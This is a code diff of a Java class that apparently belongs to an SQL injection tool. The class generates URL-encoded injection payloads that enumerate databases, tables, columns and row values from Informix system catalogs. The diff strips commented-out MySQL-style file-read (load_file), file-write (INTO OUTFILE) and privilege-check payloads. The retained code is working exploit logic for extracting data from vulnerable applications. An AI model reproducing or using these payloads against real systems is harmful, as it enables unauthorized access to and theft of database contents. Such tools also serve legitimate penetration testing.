@@ -25,10 +25,6 @@ public class InformixStrategy implements ISQLStrategy {
             "from(select+distinct+name+from+sysdatabases)t,(select+distinct+name+from+sysdatabases)t1+" +
             "where+t.name>=t1.name+" +
             "group+by+1{limit})a";
-//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.schema_name))||'jj30hh'rr,count(*)c+" +
-//        "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
-//        "where+t.schema_name>=t1.schema_name+" +
-//        "group+by+1{limit})a,(select+count(distinct+schema_name)nb+from+iischema)y";
     }
 
     @Override
@@ -38,27 +34,15 @@ public class InformixStrategy implements ISQLStrategy {
             "from(select+distinct+tabname+from+" + database + ":systables)t,(select+distinct+tabname+from+" + database + ":systables)t1+" +
             "where+t.tabname>=t1.tabname+" +
             "group+by+1{limit})a";
-//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.table_name))||'jj30hh'rr,count(*)c+" +
-//        "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
-//        "where+t.table_name>=t1.table_name+" +
-//        "group+by+1{limit})a,(select+count(distinct+table_name)nb+from+iiingres_tables+where+table_owner='" + database + "')y";
     }
 
     @Override
     public String getColumnList(Table table) {
         return 
-//            "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'%050%04'rr,count(*)c+" +
-//            "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
-//            "where+t.column_name>=t1.column_name+" +
-//            "group+by+1{limit})a";
-        "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.colname)||'%050%04'rr+" +
-        "from(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t,(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t1+" +
-        "where+t.colname>=t1.colname+" +
-        "group+by+1{limit})a";
-//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.column_name))||'jj30hh'rr,count(*)c+" +
-//        "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
-//        "where+t.column_name>=t1.column_name+" +
-//        "group+by+1{limit})a,(select+count(distinct+column_name)nb+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')y";
+            "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.colname)||'%050%04'rr+" +
+            "from(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t,(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t1+" +
+            "where+t.colname>=t1.colname+" +
+            "group+by+1{limit})a";
     }
 
     @Override
@@ -73,51 +57,21 @@ public class InformixStrategy implements ISQLStrategy {
             "from(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t1+" +
             "where+t.s>=t1.s+" +
             "group+by+1{limit})a";
-        
-//            "select+rr||0x01030307+r+from(select+0x04||trim(t.s)||'%050%04'rr,count(*)c+" +
-//            "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
-//            "where+t.s>=t1.s+" +
-//            "group+by+1{limit})a";
-//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.s))||'jj30hh'rr,count(*)c+" +
-//        "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
-//        "where+t.s>=t1.s+" +
-//        "group+by+1{limit})a,(select+count(distinct+" + formatListColumn + ")nb+from+\"" + database + "\"." + table + ")y";
     }
 
     @Override
     public String getPrivilege() {
         return "";
-//            "concat(" +
-//                "(" +
-//                    "select+" +
-//                        "hex(" +
-//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
-//                        ")" +
-//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
-//                    "where+" +
-//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
-//                        "and+PRIVILEGE_TYPE=0x46494c45" +
-//                ")," +
-//                "0x69" +
-//            ")";
     }
 
     @Override
     public String readTextFile(String filePath) {
         return "";
-//        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
     }
 
     @Override
     public String writeTextFile(String content, String filePath) {
         return "";
-//            MediatorModel.model().initialQuery
-//                .replaceAll(
-//                    "1337" + MediatorModel.model().visibleIndex + "7331",
-//                    "(select+0x" + ToolsString.strhex(content) + ")"
-//                )
-//                .replaceAll("--++", "")
-//                + "+into+outfile+\"" + filePath + "\"--+";
     }
 
     @Override
@@ -271,8 +225,11 @@ public class InformixStrategy implements ISQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-//        return "+OFFSET+" + limitSQLResult + "+FETCH+FIRST+1+ROWS+ONLY";
         return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
     }
-
+    
+    @Override
+    public String getDbLabel() {
+        return null;
+    }
 }
